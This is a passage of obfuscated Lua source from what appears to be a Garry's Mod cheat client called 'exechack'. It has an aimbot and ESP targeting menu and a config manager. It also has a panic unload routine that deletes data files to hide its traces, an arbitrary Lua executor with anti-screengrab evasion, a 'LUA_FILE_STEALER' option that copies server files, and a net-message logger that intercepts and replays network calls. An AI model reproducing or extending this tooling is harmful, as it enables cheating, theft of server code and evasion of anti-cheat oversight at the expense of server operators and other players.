                    gui.OpenURL("https://w" .. "iki.face" .. "punch.com/" .. "gmod/su" .. "rface.Play" .. "Sound")
                end)
            end)
        end)
    end)

    aE(50 + 50 + 50 + 50 + 50, "Config", function()
        au["selected"] = "Configs"
        local bB = nil
        aP("List", "efont_17", 15, 30, au.tb)
        local be = u("DComboBox", au.tb)
        be:SetPos(15, 30 + 25)
        be:SetSize(170, 27)
        be:SetFont("efont_13")
        be:SetValue("Select")
        be:SetTextColor(b._color_text)

        be.Paint = function(K, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
        end

        be.OnSelect = function(K, K, a3)
            bB = "C:/exechack/" .. a3 .. ".cfgexec"
        end

        for K, Q in g(exec_List("C:/exechack") or {}) do
            if h(Q, ".cfgexec") then
                be:AddChoice(Q:Replace(".cfgexec", ""))
            end
        end

        aS("Load Config", 15, 30 * 3, au.tb, function()
            if bB then
                D(b.maincfg, i(R(p(exec_Read(bB)))))
            end

            timer.Simple(1, function()
                aD()
            end)
        end)

        aS("Save Config", 15 + 230, 30 * 3, au.tb, function()
            if bB then
                exec_Write(bB, j(b.maincfg, "DATA"))
            end
        end)

        aS("Delete Config", 15 + 230 + 230, 30 * 3, au.tb, function()
            if bB then
                exec_Delete(bB)
                be:Clear()

                for K, Q in pairs(exec_List("C:/exechack")) do
                    if h(Q, ".cfgexec") then
                        be:AddChoice(Q:Replace(".cfgexec", ""))
                    end
                end
            end
        end)

        aP("Config name", "efont_17", 15, 30 * 4 + 20, au.tb)
        local bp = u("DTextEntry", au.tb)
        bp:SetPos(15, 30 * 4 + 45)
        bp:SetSize(220, 25)
        bp:SetText("")

        bp.Paint = function(self, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
            self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
        end

        aS("Create", 15, 30 * 6 + 20, au.tb, function()
            exec_Write("C:/exechack/" .. bp:GetText() .. ".cfgexec", j(b.maincfg, "DATA"))
            be:Clear()

            for K, Q in pairs(exec_List("C:/exechack")) do
                if h(Q, ".cfgexec") then
                    be:AddChoice(Q:Replace(".cfgexec", ""))
                end
            end
        end)

        aW("MENU_OPENKEY", 15, 30 * 8 + 5, au.tb, "Menu Key")
        aW("PANICKEY", 15 + 230, 30 * 8 + 5, au.tb, "Panic Key")
        aW("MISC_ADDENTITYFRIEND", 15, 30 * 10 + 15, au.tb, "Add Player/Entity Key")

        aS("Unload", 15, 30 * 13 + 10, au.tb, function()
            a1("WH_INFO", false)
            a1("WH_RADAR", false)
            a1("MISC_SPECTATORLIST", false)
            a1("OBSBYPASS", false)

            k(2, function()
                if n() then
                    local bC = ""

                    for K, Q in g({"PostDrawOpaqueRenderables", "RenderScreenspaceEffects", "PreDrawOpaqueRenderables", "Move", "ShutDown", "CalcView", "CreateMove", "Think", "PreDrawEffects", "PostDrawViewModel", "HUDPaint", "player_changename", "player_connect", "player_disconnect", "player_say", "player_hurt", "entity_killed", "OnEntityCreated", "RenderScene", "PostDraw2DSkyBox"}) do
                        bC = bC .. "hook.Remove('" .. Q .. "','" .. b.randomforhook .. "')"
                    end

                    T(bC)
                end

                k(3, function()
                    hide()
                    timer.Remove("check")
                    hook.Remove("Think", "fff")
                    hook.Remove("bitch", "1")

                    for K, Q in g(file.Find("*.txt", "DATA")) do
                        file.Delete(Q)
                    end
                end)
            end)
        end)
    end)

    aE(50 + 50 + 50 + 50 + 50 + 50, "Target", function()
        aZ(20, "selected_ents", "entsd", "Entity", "ENTITY", function()
            local bD = {}
            local bE = {}

            local function bF(aC, K, Q)
                if Q == "m" then
                    aP("[NO" .. "T SPAWNED] " .. K, "efont_16", 3, aC, au.enls, 300)
                elseif Q["a"] then
                    aP(K .. " (" .. Q["d"] .. ")(" .. Q["a"] .. ")", "efont_16", 3, aC, au.enls, 300)
                else
                    aP(K .. " (" .. Q["d"] .. ")", "efont_16", 3, aC, au.enls, 300)
                end

                local bG = au.enls:Add("DCheckBoxLabel")
                bG:SetPos(310, aC)
                bG:SetText("Show")
                bG:SetFont("efont_17")
                bG:SetValue(X["ENTITYLIST"][K])
                bG.Lerp = 0

                function bG:OnChange(aM)
                    if aM then
                        X["ENTITYLIST"][K] = true
                    else
                        X["ENTITYLIST"][K] = nil
                    end

                    a1("ENTITYLIST", X["ENTITYLIST"])
                end

                function bG.Button:Paint(aN, aO)
                    o(5, 0, 0, aN, aO, b._color_border)
                    o(5, 1, 1, aN - 2, aO - 2, b._color_windowbg)

                    if self:GetChecked() then
                        bG.Lerp = G(0.05, bG.Lerp, 255)
                        bG:SetTextColor(b._color_text)
                        o(3, 3, 3, aN - 6, aO - 6, t(b._color_checkbox["r"], b._color_checkbox["g"], b._color_checkbox["b"], bG.Lerp))
                    else
                        bG.Lerp = G(0.05, bG.Lerp, 150)
                        bG:SetTextColor(t(b._color_non_selected["r"], b._color_non_selected["g"], b._color_non_selected["b"], bG.Lerp))
                    end
                end

                local bH = X["ENTITYLISTclr"]
                local bI = u("DButton", au.enls)
                bI:SetSize(15, 15)
                bI:SetPos(310 + 90 + 85, aC)
                bI:SetText('')

                bI.Paint = function(ak, ay, az)
                    if bH[K .. "_Color"] then
                        o(0, 0, 0, ay, az, bH[K .. "_Color"])
                    else
                        o(0, 0, 0, ay, az, t(255, 255, 255))
                    end
                end

                bI.DoClick = function()
                    doplpanel = u("DFrame")
                    doplpanel:SetSize(121 + 15, 150 + 15)
                    doplpanel:SetPos(gui.MouseX() - 10, gui.MouseY() - 10)
                    doplpanel:SetTitle("")
                    doplpanel:MakePopup()
                    doplpanel:ShowCloseButton(false)

                    doplpanel.Paint = function(K, ay, az)
                        o(5, 0, 0, ay, az, b._color_border)
                        o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                    end

                    local bk = vgui.Create("DColorMixer", doplpanel)
                    bk:SetPos(7, 7)
                    bk:SetSize(121, 150)
                    bk:SetPalette(false)
                    bk:SetWangs(false)
                    bk:SetColor(bH[K .. "_Color"] or Color(255, 255, 255))

                    bk.ValueChanged = function()
                        bH[K .. "_Color"] = bk:GetColor()
                        a1("ENTITYLISTclr", bH)
                    end

                    doplpanel.Think = function()
                        if doplpanel and x(doplpanel) and input.IsMouseDown(107) then
                            if not doplpanel:IsChildHovered() and not doplpanel.Hovered then
                                doplpanel:Close()
                                doplpanel = nil
                            end
                        end
                    end
                end
            end

            local function bJ(ac)
                if x(au.enls) then
                    au.enls:Remove()
                end

                au.enls = u("DScrollPanel", au.tb.main)
                au.enls:SetPos(15, 70)
                au.enls:SetSize(530, 366)

                au.enls.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                local aC = 5

                for K, Q in g(bD) do
                    if h(z(K or "") or "", z(ac or "") or "") then
                        bF(aC, K, Q)
                        aC = aC + 25
                    end
                end

                for K, Q in g(bE) do
                    if h(z(K or "") or "", z(ac or "") or "") then
                        bF(aC, K, "m")
                        aC = aC + 25
                    end
                end
            end

            local bK = u("DTextEntry", au.tb.main)
            bK:SetPos(15, 30)
            bK:SetSize(460, 25)
            bK:SetText("")

            bK.Paint = function(self, ay, az)
                o(5, 0, 0, ay, az, b._color_border)
                o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
            end

            bK.OnChange = function()
                bJ(bK:GetText())
            end

            aS("Disable", 485, 30, au.tb.main, function()
                a1("ENTITYLIST", {})
            end, 60, 25)

            if n() then
                T('local a={}for b,c in pairs(ents.GetAll())do if not a[c:GetClass()]and IsEntity(c)then a[c:GetClass()]={a=c.PrintName,d=#ents.FindByClass(c:GetClass())}end end file.Write("' .. b.allentity .. '",util.TableToJSON(a))')
            end

            k(1.5, function()
                local bL = {}
                local bM = p(j(b.allentity, "DATA") or '[]')

                for Q, bN in g(bM) do
                    bD[Q] = bN
                    bL[Q] = true
                end

                for Q, bN in g(aa) do
                    if not bL[Q] then
                        bE[Q] = true
                    end
                end

                if au["selected_entslse"] == "Entity" and au["selected"] == "Target" then
                    bJ("")
                end
            end)
        end)

        aZ(50, "selected_ents", "platf", "Player", "PLAYER", function()
            local function bF(aC, K, Q)
                aP(K, "efont_16", 3, aC, au.hbf, 300)
                local bO = au.hbf:Add("DCheckBoxLabel")
                bO:SetPos(310, aC)
                bO:SetText("Friend")
                bO:SetFont("efont_17")
                bO.Lerp = 0
                local bP = X["FRIENDLIST"]

                if bP[Q["steamid32"]] == true then
                    bO:SetValue(true)
                else
                    bO:SetValue(false)
                end

                function bO:OnChange(aM)
                    if aM then
                        bP[Q["steamid32"]] = true
                    else
                        bP[Q["steamid32"]] = false
                    end

                    a1("FRIENDLIST", bP)
                end

                function bO.Button:Paint(aN, aO)
                    o(5, 0, 0, aN, aO, b._color_border)
                    o(5, 1, 1, aN - 2, aO - 2, b._color_windowbg)

                    if self:GetChecked() then
                        bO.Lerp = G(0.05, bO.Lerp, 255)
                        bO:SetTextColor(b._color_text)
                        o(3, 3, 3, aN - 6, aO - 6, t(b._color_checkbox["r"], b._color_checkbox["g"], b._color_checkbox["b"], bO.Lerp))
                    else
                        bO.Lerp = G(0.05, bO.Lerp, 150)
                        bO:SetTextColor(t(b._color_non_selected["r"], b._color_non_selected["g"], b._color_non_selected["b"], bO.Lerp))
                    end
                end
            end

            local function bQ(ac)
                local aC = 5

                if x(au.hbf) then
                    au.hbf:Remove()
                end

                au.hbf = u("DScrollPanel", au.tb.main)
                au.hbf:SetPos(15, 70)
                au.hbf:SetSize(530, 366)

                au.hbf.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                for K, Q in g(p(j(b.aimbotfriend, "DATA") or '[]')) do
                    if h(z(K or "") or "", z(ac or "") or "") then
                        bF(aC, K, Q)
                        aC = aC + 25
                    end
                end
            end

            local bK = u("DTextEntry", au.tb.main)
            bK:SetPos(15, 30)
            bK:SetSize(460, 25)
            bK:SetText("")

            bK.Paint = function(self, ay, az)
                o(5, 0, 0, ay, az, b._color_border)
                o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
            end

            bK.OnChange = function()
                bQ(bK:GetText())
            end

            aS("Disable", 485, 30, au.tb.main, function()
                a1("FRIENDLIST", {})
            end, 60, 25)

            if n() then
                T([[local a={}for b,c in pairs(player.GetHumans())do a[c:Nick()]={steamid=c:SteamID64(),steamid32=c:SteamID(),id=c:UserID()}end;file.Write("]] .. b.aimbotfriend .. [[",util.TableToJSON(a))]])
            end

            k(2, function()
                if au["selected_entslse"] == "Player" and au["selected"] == "Target" then
                    bQ("")
                end
            end)
        end)

        aZ(80, "selected_ents", "tkgf", "Team", "TEAM", function()
            local function bF(aC, K, Q)
                aP(K, "efont_16", 3, aC, au.tn, 300)
                local bR = au.tn:Add("DCheckBoxLabel")
                bR:SetPos(210, aC)
                bR:SetText("Ignore")
                bR:SetFont("efont_17")
                bR.Lerp = 0
                local bS = X["TEAMLIST"]

                if bS[K] == true then
                    bR:SetValue(true)
                else
                    bR:SetValue(false)
                end

                function bR:OnChange(aM)
                    if aM then
                        bS[K] = true
                    else
                        bS[K] = false
                    end

                    a1("TEAMLIST", bS)
                end

                function bR.Button:Paint(aN, aO)
                    o(5, 0, 0, aN, aO, b._color_border)
                    o(5, 1, 1, aN - 2, aO - 2, b._color_windowbg)

                    if self:GetChecked() then
                        bR.Lerp = G(0.05, bR.Lerp, 255)
                        bR:SetTextColor(b._color_text)
                        o(3, 3, 3, aN - 6, aO - 6, t(b._color_checkbox["r"], b._color_checkbox["g"], b._color_checkbox["b"], bR.Lerp))
                    else
                        bR.Lerp = G(0.05, bR.Lerp, 150)
                        bR:SetTextColor(t(b._color_non_selected["r"], b._color_non_selected["g"], b._color_non_selected["b"], bR.Lerp))
                    end
                end

                local bT = aG("Ignore esp", 350, aC, "", au.tn)
                local bU = X["TEAMLISTESP"]

                if bU[K] == true then
                    bT:SetValue(true)
                else
                    bT:SetValue(false)
                end

                function bT:OnChange(aM)
                    if aM then
                        bU[K] = true
                    else
                        bU[K] = false
                    end

                    a1("TEAMLISTESP", bU)
                end
            end

            local function bV(ac)
                local aC = 5

                if x(au.tn) then
                    au.tn:Remove()
                end

                au.tn = u("DScrollPanel", au.tb.main)
                au.tn:SetPos(15, 70)
                au.tn:SetSize(530, 366)

                au.tn.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                for K, Q in pairs(p(j(b.aimteams, "DATA") or '[]')) do
                    if h(z(K or "") or "", z(ac or "") or "") then
                        bF(aC, K, Q)
                        aC = aC + 25
                    end
                end
            end

            local bK = u("DTextEntry", au.tb.main)
            bK:SetPos(15, 30)
            bK:SetSize(460, 25)
            bK:SetText("")

            bK.Paint = function(self, ay, az)
                o(5, 0, 0, ay, az, b._color_border)
                o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
            end

            bK.OnChange = function()
                bV(bK:GetText())
            end

            aS("Disable", 485, 30, au.tb.main, function()
                a1("TEAMLIST", {})
            end, 60, 25)

            if n() then
                T([[local a={}for _,v in pairs(team.GetAllTeams())do a[v.Name]=true end file.Write("]] .. b.aimteams .. [[",util.TableToJSON(a))]])
            end

            k(2, function()
                if au["selected_entslse"] == "Team" and au["selected"] == "Target" then
                    bV("")
                end
            end)
        end)

        aZ(110, "selected_ents", "fd", "Rank", "RANK", function()
            local function bF(aC, K, Q)
                aP(K, "efont_16", 3, aC, au.tn, 300)
                local bR = au.tn:Add("DCheckBoxLabel")
                bR:SetPos(310, aC)
                bR:SetText("Ignore")
                bR:SetFont("efont_17")
                bR.Lerp = 0
                local bS = X["RANKLIST"]

                if bS[K] == true then
                    bR:SetValue(true)
                else
                    bR:SetValue(false)
                end

                function bR:OnChange(aM)
                    if aM then
                        bS[K] = true
                    else
                        bS[K] = false
                    end

                    a1("RANKLIST", bS)
                end

                function bR.Button:Paint(aN, aO)
                    o(5, 0, 0, aN, aO, b._color_border)
                    o(5, 1, 1, aN - 2, aO - 2, b._color_windowbg)

                    if self:GetChecked() then
                        bR.Lerp = G(0.05, bR.Lerp, 255)
                        bR:SetTextColor(b._color_text)
                        o(3, 3, 3, aN - 6, aO - 6, t(b._color_checkbox["r"], b._color_checkbox["g"], b._color_checkbox["b"], bR.Lerp))
                    else
                        bR.Lerp = G(0.05, bR.Lerp, 150)
                        bR:SetTextColor(t(b._color_non_selected["r"], b._color_non_selected["g"], b._color_non_selected["b"], bR.Lerp))
                    end
                end
            end

            local function bV(ac)
                if not au["selected_ents" .. "lse"] == "Rank" then return end
                local aC = 5

                if x(au.tn) then
                    au.tn:Remove()
                end

                au.tn = u("DScrollPanel", au.tb.main)
                au.tn:SetPos(15, 70)
                au.tn:SetSize(530, 366)

                au.tn.Paint = function(self, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                for K, Q in g(p(j(b.aimranks, "DATA") or '[]')) do
                    if h(z(K or "") or "", z(ac or "") or "") then
                        bF(aC, K, Q)
                        aC = aC + 25
                    end
                end
            end

            local bK = u("DTextEntry", au.tb.main)
            bK:SetPos(15, 30)
            bK:SetSize(460, 25)
            bK:SetText("")

            bK.Paint = function(self, ay, az)
                o(5, 0, 0, ay, az, b._color_border)
                o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
            end

            bK.OnChange = function()
                bV(bK:GetText())
            end

            aS("Disable", 485, 30, au.tb.main, function()
                a1("RANKLIST", {})
            end, 60, 25)

            if n() then
                T([[local a={}for _,v in pairs(player.GetAll())do if not a[v:GetUserGroup()]then a[v:GetUserGroup()]=true end end file.Write("]] .. b.aimranks .. [[",util.TableToJSON(a))]])
            end

            k(2, function()
                if au["selected_entslse"] == "Rank" and au["selected"] == "Target" then
                    bV("")
                end
            end)
        end)
    end)

    aE(50 + 50 + 50 + 50 + 50 + 50 + 50, "Lua", function()
        au["selected"] = "Luas"
        local bB = nil
        aP("List", "efont_17", 15, 30, au.tb)
        local be = u("DComboBox", au.tb)
        be:SetPos(15, 30 + 25)
        be:SetSize(170, 27)
        be:SetFont("efont_13")
        be:SetValue("Select")
        be:SetTextColor(b._color_text)

        be.Paint = function(K, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
        end

        be.OnSelect = function(K, K, a3)
            bB = "C:/exechack/" .. a3 .. ".lua"
        end

        for K, Q in g(exec_List("C:/exechack") or {}) do
            if h(Q, ".lua") then
                be:AddChoice(Q:Replace(".lua", ""))
            end
        end

        aS("Run Script", 15, 30 * 3, au.tb, function()
            T(exec_Read(bB), X["LUALOADER_ANTISG"])
        end)

        aS("Delete Script", 15 + 230, 30 * 3, au.tb, function()
            if bB then
                exec_Delete(bB)
                be:Clear()

                for K, Q in pairs(exec_List("C:/lua")) do
                    if h(Q, ".lua") then
                        be:AddChoice(Q:Replace(".lua", ""))
                    end
                end
            end
        end)

        local bW = aG("Editor", 15, 30 * 5 - 20, "", au.tb)
        bW:SetValue(au["loder"])

        function bW:OnChange(aM)
            au["loder"] = not au["loder"]

            if au["loder"] then
                au.lod:Show()
                au.lod:MoveToFront()
            else
                au.lod:Hide()
            end
        end

        aG("Anti Screengrab", 15, 30 * 6 - 20, "LUALOADER_ANTISG", au.tb, "On you risk")
        aG("ScriptHook", 15, 30 * 7 - 20, "LUA_FILE_STEALER", au.tb, "Save server files to dir: " .. "C:/exechack")
        local bX = aG("Save mode", 15, 30 * 8 - 20, "", au.tb, "Anti lua run")
        bX:SetValue(M)

        function bX:OnChange(aM)
            M = not M
        end
    end)

    local a = {}
    a.URL = "ht" .. "tps://e" .. "xech" .. "ack.cc/meta" .. "cons" .. "tract"
    a.COMPILE = "C"

    local aj = {
        ["\\"] = "\\\\",
        ["\0"] = "\\0",
        ["\b"] = "\\b",
        ["\t"] = "\\t",
        ["\n"] = "\\n",
        ["\v"] = "\\v",
        ["\f"] = "\\f",
        ["\r"] = "\\r",
        ["\""] = "\\\"",
        ["\'"] = "\\\'"
    }

    function a:Init()
        self.Code = ""
        self.ErrorPanel = self:Add("DButton")
        self.ErrorPanel:SetFont('BudgetLabel')
        self.ErrorPanel:SetTextColor(t(255, 255, 255))
        self.ErrorPanel:SetText("")
        self.ErrorPanel:SetTall(0)

        self.ErrorPanel.DoClick = function()
            self:GotoErrorLine()
        end

        self.ErrorPanel.DoRightClick = function(self)
            SetClipboardText(self:GetText())
        end

        self.ErrorPanel.Paint = function(self, a8, ak)
            m(255, 50, 50)
            r(0, 0, a8, ak)
        end

        self:StartHTML()
    end

    function a:Think()
        if self.NextValidate and self.NextValidate < CurTime() then
            self:ValidateCode()
        end
    end

    function a:StartHTML()
        self.HTML = self:Add("DHTML")
        self:AddJavascriptCallback("OnCode")
        self:AddJavascriptCallback("OnLog")
        self.HTML:OpenURL(self.URL)
        self.HTML:RequestFocus()
    end

    function a:ReloadHTML()
        self.HTML:OpenURL(self.URL)
    end

    function a:JavascriptSafe(al)
        al = al:gsub(".", aj)
        al = al:gsub("\226\128\168", "\\\226\128\168")
        al = al:gsub("\226\128\169", "\\\226\128\169")

        return al
    end

    function a:CallJS(_)
        self.HTML:Call(_)
    end

    function a:AddJavascriptCallback(am)
        local az = self[am]

        self.HTML:AddFunction("gmodinterface", am, function(...)
            az(self, HTML, ...)
        end)
    end

    function a:OnCode(H, bY)
        self.NextValidate = CurTime() + 0.2
        self.Code = bY
    end

    function a:OnLog(H, ...)
        print(...)
    end

    function a:SetCode(bY)
        self.Code = bY
        self:CallJS('SetContent("' .. self:JavascriptSafe(bY) .. '");')
    end

    function a:GetCode()
        return self.Code
    end

    function a:SetGutterError(aO, bZ)
        self:CallJS("SetErr('" .. aO .. "','" .. self:JavascriptSafe(bZ) .. "')")
    end

    function a:GotoLine(b_)
        self:CallJS("GotoLine('" .. b_ .. "')")
    end

    function a:ClearGutter()
        self:CallJS("ClearErr()")
    end

    function a:GotoErrorLine()
        self:GotoLine(self.ErrorLine or 1)
    end

    function a:SetError(c0)
        if not IsValid(self.HTML) then
            self.ErrorPanel:SetText("")
            self:ClearGutter()

            return
        end

        local c1 = 0

        if c0 then
            local c2, c0 = string.match(c0, self.COMPILE .. ":(%d*):(.+)")

            if c2 and c0 then
                c1 = 20
                self.ErrorPanel:SetText(c2 and c0 and "ERROR Line " .. c2 .. ": " .. c0 or c0 or "")
                self.ErrorLine = tonumber(string.match(c0, " at line (%d)%)") or c2) or 1
                self:SetGutterError(self.ErrorLine, c0)
            end
        else
            self.ErrorPanel:SetText("")
            self:ClearGutter()
        end

        local b3 = self:GetWide()
        local aN = self:GetTall()
        self.ErrorPanel:SetPos(0, aN - c1)
        self.ErrorPanel:SetSize(b3, c1)
        self.HTML:SetSize(b3, aN - c1)
    end

    function a:ValidateCode()
        local b4 = SysTime()
        local bY = self:GetCode()
        self.NextValidate = nil

        if not bY or bY == "" then
            self:SetError()

            return
        end

        local c3 = CompileString(bY, self.COMPILE, false)
        b4 = SysTime() - b4

        if type(c3) == "string" then
            self:SetError(c3)
        elseif b4 > 0.25 then
            self:SetError("Compiling took too long. (" .. math.Round(b4 * 1000) .. ")")
        else
            self:SetError()
        end
    end

    function a:PerformLayout(a8, ak)
        local c1 = self.ErrorPanel:GetTall()
        self.ErrorPanel:SetPos(0, ak - c1)
        self.ErrorPanel:SetSize(a8, c1)
        self.HTML:SetSize(a8, ak - c1)
    end

    vgui.Register("lua_executer", a, "EditablePanel")
    au.lod = u("DFrame")
    au.lod:SetSize(650, 380)
    au.lod:Center()
    au.lod:SetTitle("")
    au.lod:SetDraggable(true)
    au.lod:MakePopup()
    au.lod:ShowCloseButton(false)
    au.lod:SetSizable(true)

    au.lod.Paint = function(b3, ay, az)
        o(5, 0, 0, ay, az, b._color_border)
        o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
        s("Editor", "efont_19", 4, 4, b._color_text)
    end

    au.exective = u('lua_executer', au.lod)
    au.exective:SetPos(3, 24)
    au.exective:SetCode("")

    local c4 = aS("Run Script", 0, 0, au.lod, function()
        if n() and au.exective.ErrorPanel:GetText() == "" then
            T(au.exective:GetCode(), X["LUALOADER_ANTISG"])
        end
    end, 75, 25)

    c4.DoRightClick = function()
        if au.exective.ErrorPanel:GetText() == "" then
            RunString(au.exective:GetCode())
        end
    end

    local c5 = aS("Save", 0, 0, au.lod, function()
        doplpanel = u("DFrame")
        doplpanel:SetSize(200, 200)
        doplpanel:SetPos(gui.MouseX() - 10, gui.MouseY() - 10)
        doplpanel:SetTitle("")
        doplpanel:MakePopup()
        doplpanel:ShowCloseButton(false)

        doplpanel.Paint = function(K, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
        end

        local c6 = u("DTextEntry", doplpanel)
        c6:SetPos(3, 30)
        c6:SetSize(194, 25)
        c6:SetText("")

        c6.Paint = function(self, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, t(235, 235, 240))
            self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
        end

        c6.OnTextChanged = function()
            if x(au.cfgt) then
                b.fcfg(c6:GetValue())
            end
        end

        function b.fcfg(c7)
            if x(au.cfgt) then
                au.cfgt:Remove()
            end

            au.cfgt = u("DScrollPanel", doplpanel)
            au.cfgt:SetPos(3, 30 + 27)
            au.cfgt:SetSize(194, 100 + 67 - 27)
            au.cfgt.Paint = function(b3, aN, b4) end
            local c8 = 3

            for _, a0 in g(exec_List("C:/exechack") or {}) do
                if a0:find(".lua") then
                    if h(z(a0), z(c7 or "") or "") then
                        local c9 = a0

                        aS("-", 3, c8, au.cfgt, function()
                            exec_Delete("C:/exechack" .. "/" .. a0)
                            b.fcfg()
                        end, 25, 25)

                        aS(c9, 30, c8, au.cfgt, function()
                            au.exective:SetCode(exec_Read("C:/exechack" .. "/" .. a0))
                        end, w(1, B(c9)) + 10, 25)

                        c8 = c8 + 27
                    end
                end
            end
        end

        aS("Create", 3, 3, doplpanel, function()
            Derma_StringRequest("add 'autorun' to lua name to activate autoload", "Name", "", function(am)
                exec_Write("C:/exechack" .. "/" .. am .. ".lua", au.exective:GetCode())
                b.fcfg()
            end)
        end, 50, 25)

        b.fcfg()

        doplpanel.Think = function()
            if doplpanel and x(doplpanel) and input.IsMouseDown(107) then
                if not doplpanel:IsChildHovered() and not doplpanel.Hovered then
                    doplpanel:Close()
                    doplpanel = nil
                end
            end
        end
    end, 39, 25)

    local ca = aS("Net Logger", 0, 0, au.lod, function()
        doplpanel = u("DFrame")
        doplpanel:SetSize(250, 280 - 50)
        doplpanel:SetPos(gui.MouseX() - 10, gui.MouseY() - 10)
        doplpanel:SetTitle("")
        doplpanel:MakePopup()
        doplpanel:ShowCloseButton(false)

        doplpanel.Paint = function(K, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
        end

        aS("Run Logger", 3, 3, doplpanel, function()
            if not n() then return end

            if not file.Exists(b.netlogtxt, "DATA") then
                file.Write(b.netlogtxt, "[]")
            end

            M = false
            T([[local b,dstring="" local a=a or{ ["SendToServer"]=net.SendToServer,["Start"]=net.Start,["WriteAngle"]=net.WriteAngle,["WriteBit"]=net.WriteBit,["WriteBool"]=net.WriteBool,["WriteColor"]=net.WriteColor,["WriteData"]=net.WriteData,["WriteDouble"]=net.WriteDouble,["WriteEntity"]=net.WriteEntity,["WriteFloat"]=net.WriteFloat,["WriteInt"]=net.WriteInt,["WriteMatrix"]=net.WriteMatrix,["WriteNormal"]=net.WriteNormal,["WriteString"]=net.WriteString,["WriteTable"]=net.WriteTable,["WriteUInt"]=net.WriteUInt,["WriteVector"]=net.WriteVector}local function c(d,e)dstring="net."..e.."("for f=1,#d do dindex=d[f] if type(dindex)=="number"then  if f==#d then  dstring=dstring..dindex else  dstring=dstring..dindex..", " end  elseif type(dindex)=="boolean"then  dstring=dstring..tostring(dindex) elseif type(dindex)=="string"then  if f==#d then  dstring=dstring.."\""..dindex.."\"" else  dstring=dstring.."\""..dindex.."\", " end  elseif type(dindex)=="Player"or type(dindex)=="Entity"or type(dindex)=="NPC"then  dstring=dstring.."Entity("..tostring(dindex:EntIndex())..")" elseif type(dindex)=="Vector"then dstring=dstring.."Vector("..string.gsub(tostring(dindex),"%s+",", ")..")" elseif type(dindex)=="table"then  dstring=dstring..table.ToString(dindex) end  end; b=b..dstring..")".."\n" if string.match(b,"SendToServer")then local netname="net" for _,v in pairs(string.Explode("\n",b))do if string.find(v,"net.Start")then netname = string.Explode("net.Start",v)[2]:Replace("(",""):Replace(")",""):Replace("'",""):Replace('"',"") end end local ad=util.JSONToTable(file.Read("]] .. b.netlogtxt .. [[","DATA")) ad[os.date("%H:%M:%S").." "..netname]=util.Base64Encode(b) file.Write("]] .. b.netlogtxt .. [[",util.TableToJSON(ad)) for k, v in pairs(a) do net[k] = v end RunString(b,"lua/includes/modules/menubar.lua") for h,i in pairs(a)do net[h]=shitgay(h) end b="" end end;function shitgay(e)return function(...)c({...},e)end end;if ]] .. b.netloggerenabled .. [[==nil then for h,i in pairs(a)do net[h]=shitgay(h) end ]] .. b.netloggerenabled .. [[=true end]])
        end, 84, 25)

        local c6 = u("DTextEntry", doplpanel)
        c6:SetPos(3, 30)
        c6:SetSize(194 + 50, 25)
        c6:SetText("")

        c6.Paint = function(self, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
            self:DrawTextEntryText(b._color_text, t(30, 130, 255), b._color_text)
        end

        c6.OnTextChanged = function()
            if x(au.nlog) then
                b.netloglist(c6:GetValue())
            end
        end

        function b.netloglist(c7)
            if x(au.nlog) then
                au.nlog:Remove()
            end

            au.nlog = u("DScrollPanel", doplpanel)
            au.nlog:SetPos(3, 30 + 27)
            au.nlog:SetSize(194 + 50, 100 + 67 - 27 + 30)
            au.nlog.Paint = function(b3, aN, b4) end
            local c8 = 3

            for _, a0 in g(p(j(b.netlogtxt, "DATA") or '[]') or {}) do
                if h(z(_), z(c7 or "") or "") then
                    aS(_, 3, c8, au.nlog, function()
                        au.exective:SetCode(util.Base64Decode(a0))
                    end, w(1, B(_)) + 10, 25)

                    c8 = c8 + 27
                end
            end
        end

        b.netloglist("")

        aS("Refresh", 3 + 84 + 2, 3, doplpanel, function()
            b.netloglist("")
        end, 58, 25)

        aS("Clear", 3 + 84 + 2 + 58 + 2, 3, doplpanel, function()
            D(b.netlogtxt, "[]")

            k(1, function()
                b.netloglist("")
            end)
        end, 40, 25)

        doplpanel.Think = function()
            if doplpanel and x(doplpanel) and input.IsMouseDown(107) then
                if not doplpanel:IsChildHovered() and not doplpanel.Hovered then
                    doplpanel:Close()
                    doplpanel = nil
                end
            end
        end
    end, 76, 25)

    au.lod.PerformLayout = function(self, a8, ak)
        au.exective:SetSize(a8 - 6, ak - 56)
        c4:SetPos(a8 - 78, ak - 29)
        c5:SetPos(3, ak - 29)
        ca:SetPos(100 - 54, ak - 29)
    end

    au.lod:Hide()

    function show()
        ax:Show()

        if au["loder"] then
            au.lod:Show()
        end
    end

    function hide()
        ax:Hide()

        if au["loder"] then
            au.lod:Hide()
        end
    end

